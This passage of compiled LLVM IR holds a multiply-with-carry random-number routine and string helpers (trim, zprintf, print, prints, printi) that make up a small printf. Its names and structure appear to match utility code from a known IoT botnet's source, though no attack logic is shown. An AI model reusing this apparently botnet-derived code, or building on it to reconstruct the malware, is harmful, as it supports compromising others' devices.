  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  store i32 %18, i32* %5, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #1 {
  %2 = tail call i64 @strlen(i8* %0) #15
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #15
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %80
  %.0.lcssa.ph = phi i32 [ %79, %.lr.ph22 ], [ %81, %80 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %17 = sext i32 %.0.lcssa to i64
  %18 = icmp sgt i64 %17, %16
  %smax = select i1 %18, i64 %17, i64 %16
  %19 = add nsw i64 %smax, 1
  %20 = sub nsw i64 %19, %16
  %min.iters.check = icmp ult i64 %20, 32
  br i1 %min.iters.check, label %.critedge.preheader39, label %min.iters.checked

.critedge.preheader39:                            ; preds = %middle.block, %vector.memcheck, %min.iters.checked, %.critedge.preheader26
  %indvars.iv.ph = phi i64 [ %16, %vector.memcheck ], [ %16, %min.iters.checked ], [ %16, %.critedge.preheader26 ], [ %ind.end, %middle.block ]
  br label %.critedge

min.iters.checked:                                ; preds = %.critedge.preheader26
  %n.vec = and i64 %20, -32
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.critedge.preheader39, label %vector.memcheck

vector.memcheck:                                  ; preds = %min.iters.checked
  %21 = icmp sgt i64 %17, %16
  %smax34 = select i1 %21, i64 %17, i64 %16
  %22 = add nsw i64 %smax34, 1
  %23 = sub nsw i64 %22, %16
  %scevgep = getelementptr i8, i8* %0, i64 %23
  %scevgep35 = getelementptr i8, i8* %0, i64 %16
  %scevgep36 = getelementptr i8, i8* %0, i64 %22
  %bound0 = icmp ugt i8* %scevgep36, %0
  %bound1 = icmp ult i8* %scevgep35, %scevgep
  %memcheck.conflict = and i1 %bound0, %bound1
  %ind.end = add nsw i64 %16, %n.vec
  br i1 %memcheck.conflict, label %.critedge.preheader39, label %vector.body.preheader

vector.body.preheader:                            ; preds = %vector.memcheck
  %24 = add nsw i64 %n.vec, -32
  %25 = lshr exact i64 %24, 5
  %26 = add nuw nsw i64 %25, 1
  %xtraiter = and i64 %26, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %vector.body.prol.loopexit, label %vector.body.prol.preheader

vector.body.prol.preheader:                       ; preds = %vector.body.preheader
  br label %vector.body.prol

vector.body.prol:                                 ; preds = %vector.body.prol, %vector.body.prol.preheader
  %index.prol = phi i64 [ %index.next.prol, %vector.body.prol ], [ 0, %vector.body.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %vector.body.prol ], [ %xtraiter, %vector.body.prol.preheader ]
  %27 = add i64 %16, %index.prol
  %28 = getelementptr inbounds i8, i8* %0, i64 %27
  %29 = bitcast i8* %28 to <16 x i8>*
  %wide.load.prol = load <16 x i8>, <16 x i8>* %29, align 1, !alias.scope !4
  %30 = getelementptr i8, i8* %28, i64 16
  %31 = bitcast i8* %30 to <16 x i8>*
  %wide.load38.prol = load <16 x i8>, <16 x i8>* %31, align 1, !alias.scope !4
  %32 = getelementptr inbounds i8, i8* %0, i64 %index.prol
  %33 = bitcast i8* %32 to <16 x i8>*
  store <16 x i8> %wide.load.prol, <16 x i8>* %33, align 1, !alias.scope !7, !noalias !4
  %34 = getelementptr i8, i8* %32, i64 16
  %35 = bitcast i8* %34 to <16 x i8>*
  store <16 x i8> %wide.load38.prol, <16 x i8>* %35, align 1, !alias.scope !7, !noalias !4
  %index.next.prol = add i64 %index.prol, 32
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %vector.body.prol.loopexit.unr-lcssa, label %vector.body.prol, !llvm.loop !9

vector.body.prol.loopexit.unr-lcssa:              ; preds = %vector.body.prol
  br label %vector.body.prol.loopexit

vector.body.prol.loopexit:                        ; preds = %vector.body.preheader, %vector.body.prol.loopexit.unr-lcssa
  %index.unr = phi i64 [ 0, %vector.body.preheader ], [ %index.next.prol, %vector.body.prol.loopexit.unr-lcssa ]
  %36 = icmp ult i64 %24, 96
  br i1 %36, label %middle.block, label %vector.body.preheader.new

vector.body.preheader.new:                        ; preds = %vector.body.prol.loopexit
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %vector.body.preheader.new
  %index = phi i64 [ %index.unr, %vector.body.preheader.new ], [ %index.next.3, %vector.body ]
  %37 = add i64 %16, %index
  %38 = getelementptr inbounds i8, i8* %0, i64 %37
  %39 = bitcast i8* %38 to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %39, align 1, !alias.scope !4
  %40 = getelementptr i8, i8* %38, i64 16
  %41 = bitcast i8* %40 to <16 x i8>*
  %wide.load38 = load <16 x i8>, <16 x i8>* %41, align 1, !alias.scope !4
  %42 = getelementptr inbounds i8, i8* %0, i64 %index
  %43 = bitcast i8* %42 to <16 x i8>*
  store <16 x i8> %wide.load, <16 x i8>* %43, align 1, !alias.scope !7, !noalias !4
  %44 = getelementptr i8, i8* %42, i64 16
  %45 = bitcast i8* %44 to <16 x i8>*
  store <16 x i8> %wide.load38, <16 x i8>* %45, align 1, !alias.scope !7, !noalias !4
  %index.next = add i64 %index, 32
  %46 = add i64 %16, %index.next
  %47 = getelementptr inbounds i8, i8* %0, i64 %46
  %48 = bitcast i8* %47 to <16 x i8>*
  %wide.load.1 = load <16 x i8>, <16 x i8>* %48, align 1, !alias.scope !4
  %49 = getelementptr i8, i8* %47, i64 16
  %50 = bitcast i8* %49 to <16 x i8>*
  %wide.load38.1 = load <16 x i8>, <16 x i8>* %50, align 1, !alias.scope !4
  %51 = getelementptr inbounds i8, i8* %0, i64 %index.next
  %52 = bitcast i8* %51 to <16 x i8>*
  store <16 x i8> %wide.load.1, <16 x i8>* %52, align 1, !alias.scope !7, !noalias !4
  %53 = getelementptr i8, i8* %51, i64 16
  %54 = bitcast i8* %53 to <16 x i8>*
  store <16 x i8> %wide.load38.1, <16 x i8>* %54, align 1, !alias.scope !7, !noalias !4
  %index.next.1 = add i64 %index, 64
  %55 = add i64 %16, %index.next.1
  %56 = getelementptr inbounds i8, i8* %0, i64 %55
  %57 = bitcast i8* %56 to <16 x i8>*
  %wide.load.2 = load <16 x i8>, <16 x i8>* %57, align 1, !alias.scope !4
  %58 = getelementptr i8, i8* %56, i64 16
  %59 = bitcast i8* %58 to <16 x i8>*
  %wide.load38.2 = load <16 x i8>, <16 x i8>* %59, align 1, !alias.scope !4
  %60 = getelementptr inbounds i8, i8* %0, i64 %index.next.1
  %61 = bitcast i8* %60 to <16 x i8>*
  store <16 x i8> %wide.load.2, <16 x i8>* %61, align 1, !alias.scope !7, !noalias !4
  %62 = getelementptr i8, i8* %60, i64 16
  %63 = bitcast i8* %62 to <16 x i8>*
  store <16 x i8> %wide.load38.2, <16 x i8>* %63, align 1, !alias.scope !7, !noalias !4
  %index.next.2 = add i64 %index, 96
  %64 = add i64 %16, %index.next.2
  %65 = getelementptr inbounds i8, i8* %0, i64 %64
  %66 = bitcast i8* %65 to <16 x i8>*
  %wide.load.3 = load <16 x i8>, <16 x i8>* %66, align 1, !alias.scope !4
  %67 = getelementptr i8, i8* %65, i64 16
  %68 = bitcast i8* %67 to <16 x i8>*
  %wide.load38.3 = load <16 x i8>, <16 x i8>* %68, align 1, !alias.scope !4
  %69 = getelementptr inbounds i8, i8* %0, i64 %index.next.2
  %70 = bitcast i8* %69 to <16 x i8>*
  store <16 x i8> %wide.load.3, <16 x i8>* %70, align 1, !alias.scope !7, !noalias !4
  %71 = getelementptr i8, i8* %69, i64 16
  %72 = bitcast i8* %71 to <16 x i8>*
  store <16 x i8> %wide.load38.3, <16 x i8>* %72, align 1, !alias.scope !7, !noalias !4
  %index.next.3 = add i64 %index, 128
  %73 = icmp eq i64 %index.next.3, %n.vec
  br i1 %73, label %middle.block.unr-lcssa, label %vector.body, !llvm.loop !11

middle.block.unr-lcssa:                           ; preds = %vector.body
  br label %middle.block

middle.block:                                     ; preds = %vector.body.prol.loopexit, %middle.block.unr-lcssa
  %cmp.n = icmp eq i64 %20, %n.vec
  br i1 %cmp.n, label %.critedge._crit_edge, label %.critedge.preheader39

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %80
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %80 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %81, %80 ]
  %74 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = tail call i32 @isspace(i32 %76) #15
  %78 = icmp eq i32 %77, 0
  %79 = trunc i64 %indvars.iv27 to i32
  br i1 %78, label %.critedge.preheader.loopexit, label %80

; <label>:80:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %81 = add nsw i32 %.021, -1
  %82 = icmp sgt i64 %indvars.iv27, %14
  br i1 %82, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader39, %.critedge
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge ], [ %indvars.iv.ph, %.critedge.preheader39 ]
  %83 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %84 = load i8, i8* %83, align 1
  %85 = sub nsw i64 %indvars.iv, %16
  %86 = getelementptr inbounds i8, i8* %0, i64 %85
  store i8 %84, i8* %86, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %87 = icmp slt i64 %indvars.iv, %17
  br i1 %87, label %.critedge, label %.critedge._crit_edge.loopexit, !llvm.loop !12

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %middle.block, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %ind.end, %middle.block ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %88 = sub i64 %.019.lcssa, %indvars.iv29
  %sext33 = shl i64 %88, 32
  %89 = ashr exact i64 %sext33, 32
  %90 = getelementptr inbounds i8, i8* %0, i64 %89
  store i8 0, i8* %90, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %2 = alloca [1 x %struct.__va_list_tag], align 16
  %3 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %2, i64 0, i64 0
  %4 = bitcast [1 x %struct.__va_list_tag]* %2 to i8*
  call void @llvm.va_start(i8* nonnull %4)
  %5 = call fastcc i32 @print(i8** null, i8* %0, %struct.__va_list_tag* nonnull %3)
  ret i32 %5
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #1 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %9 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  br label %10

; <label>:10:                                     ; preds = %138, %3
  %.061 = phi i32 [ 0, %3 ], [ %.162, %138 ]
  %.0 = phi i8* [ %1, %3 ], [ %139, %138 ]
  %11 = load i8, i8* %.0, align 1
  switch i8 %11, label %134 [
    i8 0, label %140
    i8 37, label %12
  ]

; <label>:12:                                     ; preds = %10
  %13 = getelementptr inbounds i8, i8* %.0, i64 1
  %14 = load i8, i8* %13, align 1
  switch i8 %14, label %.preheader70 [
    i8 0, label %140
    i8 37, label %134
    i8 45, label %15
  ]

; <label>:15:                                     ; preds = %12
  %16 = getelementptr inbounds i8, i8* %.0, i64 2
  %.pre = load i8, i8* %16, align 1
  br label %.preheader70

.preheader70:                                     ; preds = %15, %12
  %17 = phi i8 [ %14, %12 ], [ %.pre, %15 ]
  %.063.ph = phi i32 [ 0, %12 ], [ 1, %15 ]
  %.1.ph = phi i8* [ %13, %12 ], [ %16, %15 ]
  %18 = icmp eq i8 %17, 48
  br i1 %18, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader70
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader70
  %19 = phi i8 [ %17, %.preheader70 ], [ %23, %.preheader.loopexit ]
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader70 ], [ %22, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader70 ], [ %21, %.preheader.loopexit ]
  %.off74 = add i8 %19, -48
  %20 = icmp ult i8 %.off74, 10
  br i1 %20, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.preheader
  br label %.lr.ph77

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.172 = phi i8* [ %21, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.06371 = phi i32 [ %22, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %21 = getelementptr inbounds i8, i8* %.172, i64 1
  %22 = or i32 %.06371, 2
  %23 = load i8, i8* %21, align 1
  %24 = icmp eq i8 %23, 48
  br i1 %24, label %.lr.ph, label %.preheader.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.lr.ph77
  %25 = phi i8 [ %31, %.lr.ph77 ], [ %19, %.lr.ph77.preheader ]
  %.276 = phi i8* [ %30, %.lr.ph77 ], [ %.1.lcssa, %.lr.ph77.preheader ]
  %.06475 = phi i32 [ %29, %.lr.ph77 ], [ 0, %.lr.ph77.preheader ]
  %26 = zext i8 %25 to i32
  %27 = mul nsw i32 %.06475, 10
  %28 = add i32 %27, -48
  %29 = add i32 %28, %26
  %30 = getelementptr inbounds i8, i8* %.276, i64 1
  %31 = load i8, i8* %30, align 1
  %.off = add i8 %31, -48
  %32 = icmp ult i8 %.off, 10
  br i1 %32, label %.lr.ph77, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph77
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %29, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %30, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %19, %.preheader ], [ %31, %.critedge.loopexit ]
  switch i8 %.lcssa, label %138 [
    i8 115, label %33
    i8 100, label %53
    i8 120, label %69
    i8 88, label %85
    i8 117, label %101
    i8 99, label %117
  ]

; <label>:33:                                     ; preds = %.critedge
  %34 = load i32, i32* %5, align 8
  %35 = icmp ult i32 %34, 41
  br i1 %35, label %36, label %41

; <label>:36:                                     ; preds = %33
  %37 = load i8*, i8** %6, align 8
  %38 = sext i32 %34 to i64
  %39 = getelementptr i8, i8* %37, i64 %38
  %40 = add i32 %34, 8
  store i32 %40, i32* %5, align 8
  br label %44

; <label>:41:                                     ; preds = %33
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr i8, i8* %42, i64 8
  store i8* %43, i8** %7, align 8
  br label %44

; <label>:44:                                     ; preds = %41, %36
  %.in69 = phi i8* [ %39, %36 ], [ %42, %41 ]
  %45 = bitcast i8* %.in69 to i32*
  %46 = load i32, i32* %45, align 4
  %47 = sext i32 %46 to i64
  %48 = inttoptr i64 %47 to i8*
  %49 = icmp ne i32 %46, 0
  %50 = select i1 %49, i8* %48, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.132, i64 0, i64 0)
  %51 = tail call fastcc i32 @prints(i8** %0, i8* %50, i32 %.064.lcssa, i32 %.063.lcssa)
  %52 = add nsw i32 %51, %.061
  br label %138

; <label>:53:                                     ; preds = %.critedge
  %54 = load i32, i32* %5, align 8
  %55 = icmp ult i32 %54, 41
  br i1 %55, label %56, label %61

; <label>:56:                                     ; preds = %53
  %57 = load i8*, i8** %6, align 8
  %58 = sext i32 %54 to i64
  %59 = getelementptr i8, i8* %57, i64 %58
  %60 = add i32 %54, 8
  store i32 %60, i32* %5, align 8
  br label %64

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %7, align 8
  %63 = getelementptr i8, i8* %62, i64 8
  store i8* %63, i8** %7, align 8
  br label %64

; <label>:64:                                     ; preds = %61, %56
  %.in68 = phi i8* [ %59, %56 ], [ %62, %61 ]
  %65 = bitcast i8* %.in68 to i32*
  %66 = load i32, i32* %65, align 4
  %67 = tail call fastcc i32 @printi(i8** %0, i32 %66, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %68 = add nsw i32 %67, %.061
  br label %138

; <label>:69:                                     ; preds = %.critedge
  %70 = load i32, i32* %5, align 8
  %71 = icmp ult i32 %70, 41
  br i1 %71, label %72, label %77

; <label>:72:                                     ; preds = %69
  %73 = load i8*, i8** %6, align 8
  %74 = sext i32 %70 to i64
  %75 = getelementptr i8, i8* %73, i64 %74
  %76 = add i32 %70, 8
  store i32 %76, i32* %5, align 8
  br label %80

; <label>:77:                                     ; preds = %69
  %78 = load i8*, i8** %7, align 8
  %79 = getelementptr i8, i8* %78, i64 8
  store i8* %79, i8** %7, align 8
  br label %80

; <label>:80:                                     ; preds = %77, %72
  %.in67 = phi i8* [ %75, %72 ], [ %78, %77 ]
  %81 = bitcast i8* %.in67 to i32*
  %82 = load i32, i32* %81, align 4
  %83 = tail call fastcc i32 @printi(i8** %0, i32 %82, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %84 = add nsw i32 %83, %.061
  br label %138

; <label>:85:                                     ; preds = %.critedge
  %86 = load i32, i32* %5, align 8
  %87 = icmp ult i32 %86, 41
  br i1 %87, label %88, label %93

; <label>:88:                                     ; preds = %85
  %89 = load i8*, i8** %6, align 8
  %90 = sext i32 %86 to i64
  %91 = getelementptr i8, i8* %89, i64 %90
  %92 = add i32 %86, 8
  store i32 %92, i32* %5, align 8
  br label %96

; <label>:93:                                     ; preds = %85
  %94 = load i8*, i8** %7, align 8
  %95 = getelementptr i8, i8* %94, i64 8
  store i8* %95, i8** %7, align 8
  br label %96

; <label>:96:                                     ; preds = %93, %88
  %.in66 = phi i8* [ %91, %88 ], [ %94, %93 ]
  %97 = bitcast i8* %.in66 to i32*
  %98 = load i32, i32* %97, align 4
  %99 = tail call fastcc i32 @printi(i8** %0, i32 %98, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  %100 = add nsw i32 %99, %.061
  br label %138

; <label>:101:                                    ; preds = %.critedge
  %102 = load i32, i32* %5, align 8
  %103 = icmp ult i32 %102, 41
  br i1 %103, label %104, label %109

; <label>:104:                                    ; preds = %101
  %105 = load i8*, i8** %6, align 8
  %106 = sext i32 %102 to i64
  %107 = getelementptr i8, i8* %105, i64 %106
  %108 = add i32 %102, 8
  store i32 %108, i32* %5, align 8
  br label %112

; <label>:109:                                    ; preds = %101
  %110 = load i8*, i8** %7, align 8
  %111 = getelementptr i8, i8* %110, i64 8
  store i8* %111, i8** %7, align 8
  br label %112

; <label>:112:                                    ; preds = %109, %104
  %.in65 = phi i8* [ %107, %104 ], [ %110, %109 ]
  %113 = bitcast i8* %.in65 to i32*
  %114 = load i32, i32* %113, align 4
  %115 = tail call fastcc i32 @printi(i8** %0, i32 %114, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %116 = add nsw i32 %115, %.061
  br label %138

; <label>:117:                                    ; preds = %.critedge
  %118 = load i32, i32* %5, align 8
  %119 = icmp ult i32 %118, 41
  br i1 %119, label %120, label %125

; <label>:120:                                    ; preds = %117
  %121 = load i8*, i8** %6, align 8
  %122 = sext i32 %118 to i64
  %123 = getelementptr i8, i8* %121, i64 %122
  %124 = add i32 %118, 8
  store i32 %124, i32* %5, align 8
  br label %128

; <label>:125:                                    ; preds = %117
  %126 = load i8*, i8** %7, align 8
  %127 = getelementptr i8, i8* %126, i64 8
  store i8* %127, i8** %7, align 8
  br label %128

; <label>:128:                                    ; preds = %125, %120
  %.in = phi i8* [ %123, %120 ], [ %126, %125 ]
  %129 = bitcast i8* %.in to i32*
  %130 = load i32, i32* %129, align 4
  %131 = trunc i32 %130 to i8
  store i8 %131, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %132 = call fastcc i32 @prints(i8** %0, i8* nonnull %8, i32 %.064.lcssa, i32 %.063.lcssa)
  %133 = add nsw i32 %132, %.061
  br label %138

; <label>:134:                                    ; preds = %12, %10
  %135 = phi i8 [ %11, %10 ], [ 37, %12 ]
  %.3 = phi i8* [ %.0, %10 ], [ %13, %12 ]
  %136 = zext i8 %135 to i32
  tail call fastcc void @printchar(i8** %0, i32 %136)
  %137 = add nsw i32 %.061, 1
  br label %138

; <label>:138:                                    ; preds = %.critedge, %134, %128, %112, %96, %80, %64, %44
  %.162 = phi i32 [ %137, %134 ], [ %52, %44 ], [ %68, %64 ], [ %84, %80 ], [ %100, %96 ], [ %116, %112 ], [ %133, %128 ], [ %.061, %.critedge ]
  %.4 = phi i8* [ %.3, %134 ], [ %.2.lcssa, %44 ], [ %.2.lcssa, %64 ], [ %.2.lcssa, %80 ], [ %.2.lcssa, %96 ], [ %.2.lcssa, %112 ], [ %.2.lcssa, %128 ], [ %.2.lcssa, %.critedge ]
  %139 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %10

; <label>:140:                                    ; preds = %12, %10
  %141 = icmp eq i8** %0, null
  br i1 %141, label %144, label %142

; <label>:142:                                    ; preds = %140
  %143 = load i8*, i8** %0, align 8
  store i8 0, i8* %143, align 1
  br label %144

; <label>:144:                                    ; preds = %140, %142
  %145 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %145)
  ret i32 %.061
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #1 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #1 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
